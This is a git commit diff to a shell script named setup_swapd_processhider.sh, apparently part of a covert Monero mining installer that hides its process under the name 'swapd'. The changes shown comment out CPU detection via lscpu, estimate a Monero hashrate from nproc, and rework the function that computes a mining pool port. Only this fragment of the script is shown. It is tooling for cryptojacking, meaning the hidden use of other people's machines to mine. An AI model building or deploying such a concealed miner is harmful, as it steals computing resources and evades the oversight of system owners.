4fabbb92b17108afca3e79f294f13aa2e7995455
littlAcen <113854209+littlAcen@users.noreply.github.com>
2023-09-23 17:19:35 +0200

    Update setup_swapd_processhider.sh

--- setup_swapd_processhider.sh
+++ setup_swapd_processhider.sh
@@ -82,54 +82,54 @@ fi
 #fi
 
 # calculating port
-LSCPU=`lscpu`
-CPU_SOCKETS=`echo "$LSCPU" | grep "^Socket(s):" | cut -d':' -f2 | sed "s/^[ \t]*//"`
-if [ -z $CPU_SOCKETS ]; then
-  echo "WARNING: Can't get CPU sockets from lscpu output"
-  export CPU_SOCKETS=1
-fi
-CPU_CORES_PER_SOCKET=`echo "$LSCPU" | grep "^Core(s) per socket:" | cut -d':' -f2 | sed "s/^[ \t]*//"`
-if [ -z "$CPU_CORES_PER_SOCKET" ]; then
-  echo "WARNING: Can't get CPU cores per socket from lscpu output"
-  export CPU_CORES_PER_SOCKET=1
-fi
-CPU_THREADS=`echo "$LSCPU" | grep "^CPU(s):" | cut -d':' -f2 | sed "s/^[ \t]*//"`
-if [ -z "$CPU_THREADS" ]; then
-  echo "WARNING: Can't get CPU cores from lscpu output"
-  if ! type nproc >/dev/null; then
-    echo "WARNING: This script requires \"nproc\" utility to work correctly"
-    export CPU_THREADS=1
-  else
-    CPU_THREADS=`nproc`
-    if [ -z "$CPU_THREADS" ]; then
-      echo "WARNING: Can't get CPU cores from nproc output"
-      export CPU_THREADS=1
-    fi
-  fi
-fi
-CPU_MHZ=`echo "$LSCPU" | grep "^CPU max MHz:" | cut -d':' -f2 | sed "s/^[ \t]*//"`
-CPU_MHZ=${CPU_MHZ%.*}
-if [ -z "$CPU_MHZ" ]; then
-  echo "WARNING: Can't get CPU MHz from lscpu output"
-  export CPU_MHZ=1000
-fi
-CPU_L1_CACHE=`echo "$LSCPU" | grep "^L1d" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
-if echo "$CPU_L1_CACHE" | grep MiB >/dev/null; then
-  CPU_L1_CACHE=`echo "$CPU_L1_CACHE" | sed "s/ MiB\$//"`
-  CPU_L1_CACHE=$(( $CPU_L1_CACHE * 1024))
-fi
-if [ -z "$CPU_L1_CACHE" ]; then
-  echo "WARNING: Can't get L1 CPU cache from lscpu output"
-  export CPU_L1_CACHE=16
-fi
-CPU_L2_CACHE=`echo "$LSCPU" | grep "^L2" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
-if echo "$CPU_L2_CACHE" | grep MiB >/dev/null; then
-  CPU_L2_CACHE=`echo "$CPU_L2_CACHE" | sed "s/ MiB\$//"`
-  CPU_L2_CACHE=$(( $CPU_L2_CACHE * 1024))
-fi
-if [ -z "$CPU_L2_CACHE" ]; then
-  echo "WARNING: Can't get L2 CPU cache from lscpu output"
-  export CPU_L2_CACHE=256
+#LSCPU=`lscpu`
+#CPU_SOCKETS=`echo "$LSCPU" | grep "^Socket(s):" | cut -d':' -f2 | sed "s/^[ \t]*//"`
+#if [ -z $CPU_SOCKETS ]; then
+#  echo "WARNING: Can't get CPU sockets from lscpu output"
+#  export CPU_SOCKETS=1
+#fi
+#CPU_CORES_PER_SOCKET=`echo "$LSCPU" | grep "^Core(s) per socket:" | cut -d':' -f2 | sed "s/^[ \t]*//"`
+#if [ -z "$CPU_CORES_PER_SOCKET" ]; then
+#  echo "WARNING: Can't get CPU cores per socket from lscpu output"
+#  export CPU_CORES_PER_SOCKET=1
+#fi
+#CPU_THREADS=`echo "$LSCPU" | grep "^CPU(s):" | cut -d':' -f2 | sed "s/^[ \t]*//"`
+#if [ -z "$CPU_THREADS" ]; then
+#  echo "WARNING: Can't get CPU cores from lscpu output"
+#  if ! type nproc >/dev/null; then
+#    echo "WARNING: This script requires \"nproc\" utility to work correctly"
+#    export CPU_THREADS=1
+#  else
+#    CPU_THREADS=`nproc`
+##    if [ -z "$CPU_THREADS" ]; then
+ #     echo "WARNING: Can't get CPU cores from nproc output"
+ #     export CPU_THREADS=1
+ #   fi
+ # fi
+#fi
+#CPU_MHZ=`echo "$LSCPU" | grep "^CPU max MHz:" | cut -d':' -f2 | sed "s/^[ \t]*//"`
+#CPU_MHZ=${CPU_MHZ%.*}
+#if [ -z "$CPU_MHZ" ]; then
+#  echo "WARNING: Can't get CPU MHz from lscpu output"
+#  export CPU_MHZ=1000
+#fi
+#CPU_L1_CACHE=`echo "$LSCPU" | grep "^L1d" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
+#if echo "$CPU_L1_CACHE" | grep MiB >/dev/null; then
+#  CPU_L1_CACHE=`echo "$CPU_L1_CACHE" | sed "s/ MiB\$//"`
+#  CPU_L1_CACHE=$(( $CPU_L1_CACHE * 1024))
+#fi
+#if [ -z "$CPU_L1_CACHE" ]; then
+#  echo "WARNING: Can't get L1 CPU cache from lscpu output"
+#  export CPU_L1_CACHE=16
+#fi
+#CPU_L2_CACHE=`echo "$LSCPU" | grep "^L2" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
+#if echo "$CPU_L2_CACHE" | grep MiB >/dev/null; then
+#  CPU_L2_CACHE=`echo "$CPU_L2_CACHE" | sed "s/ MiB\$//"`
+#  CPU_L2_CACHE=$(( $CPU_L2_CACHE * 1024))
+#fi
+#if [ -z "$CPU_L2_CACHE" ]; then
+#  echo "WARNING: Can't get L2 CPU cache from lscpu output"
+#  export CPU_L2_CACHE=256
 #fi
 #CPU_L3_CACHE=`echo "$LSCPU" | grep "^L3" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
 #if echo "$CPU_L3_CACHE" | grep MiB >/dev/null; then
@@ -138,8 +138,8 @@ if [ -z "$CPU_L2_CACHE" ]; then
 #fi
 #if [ -z "$CPU_L3_CACHE" ]; then
 #  echo "WARNING: Can't get L3 CPU cache from lscpu output"
-  export CPU_L3_CACHE=2048
-fi
+#  export CPU_L3_CACHE=2048
+#fi
 
 #TOTAL_CACHE=$(( $CPU_THREADS*$CPU_L1_CACHE + $CPU_SOCKETS * ($CPU_CORES_PER_SOCKET*$CPU_L2_CACHE + $CPU_L3_CACHE)))
 #if [ -z $TOTAL_CACHE ]; then
@@ -152,38 +152,42 @@ fi
 #  exit 1
 #fi
 
-power2() {
-apt install -y bc 2>/dev/null 1>/dev/null
-yum install -y bc 2>/dev/null 1>/dev/null
+CPU_THREADS=$(nproc)
+EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
+if [ -z $EXP_MONERO_HASHRATE ]; then
+  echo "ERROR: Can't compute projected Monero CN hashrate"
+  exit 1
+fi
 
+power2() {
   if ! type bc >/dev/null; then
-    if [ "$1" -gt "204800" ]; then
+    if   [ "$1" -gt "8192" ]; then
       echo "8192"
-    elif [ "$1" -gt "102400" ]; then
+    elif [ "$1" -gt "4096" ]; then
       echo "4096"
-    elif [ "$1" -gt "51200" ]; then
+    elif [ "$1" -gt "2048" ]; then
       echo "2048"
-    elif [ "$1" -gt "25600" ]; then
+    elif [ "$1" -gt "1024" ]; then
       echo "1024"
-    elif [ "$1" -gt "12800" ]; then
+    elif [ "$1" -gt "512" ]; then
       echo "512"
-    elif [ "$1" -gt "6400" ]; then
+    elif [ "$1" -gt "256" ]; then
       echo "256"
-    elif [ "$1" -gt "3200" ]; then
+    elif [ "$1" -gt "128" ]; then
       echo "128"
-    elif [ "$1" -gt "1600" ]; then
+    elif [ "$1" -gt "64" ]; then
       echo "64"
-    elif [ "$1" -gt "800" ]; then
+    elif [ "$1" -gt "32" ]; then
       echo "32"
-    elif [ "$1" -gt "400" ]; then
+    elif [ "$1" -gt "16" ]; then
       echo "16"
-    elif [ "$1" -gt "200" ]; then
+    elif [ "$1" -gt "8" ]; then
       echo "8"
-    elif [ "$1" -gt "100" ]; then
+    elif [ "$1" -gt "4" ]; then
       echo "4"
-    elif [ "$1" -gt "50" ]; then
+    elif [ "$1" -gt "2" ]; then
       echo "2"
-    else 
+    else
       echo "1"
     fi
   else 
@@ -191,7 +195,7 @@ yum install -y bc 2>/dev/null 1>/dev/null
   fi
 }
 
-PORT=$(( $EXP_MONERO_HASHRATE * 12 / 1000 ))
+PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
 PORT=$(( $PORT == 0 ? 1 : $PORT ))
 PORT=`power2 $PORT`
 PORT=$(( 10000 + $PORT ))
@@ -204,6 +208,7 @@ if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
   echo "ERROR: Wrong computed port value: $PORT"
   exit 1
 fi
+
 
 
 # printing intentions
